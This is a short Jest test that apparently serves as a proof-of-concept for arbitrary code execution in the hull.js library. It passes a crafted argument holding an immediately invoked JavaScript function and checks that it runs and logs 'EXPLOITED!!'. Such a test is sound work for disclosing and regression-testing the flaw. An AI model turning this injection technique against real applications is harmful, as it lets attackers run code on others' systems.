test("Arbitrary code execution in hull.js", (done) => {
  const hull = require("hull.js");

  console.log = jest.fn();

  const payload = [
    '[(()=>{ console.log("EXPLOITED!!"); return "x"; })()]',
    '["y"]'
  ];

  const pointset = [{ x: 1, y: 2 }];

  hull(pointset, 20, payload);

  expect(console.log).toHaveBeenCalledWith('EXPLOITED!!');
  done();
});
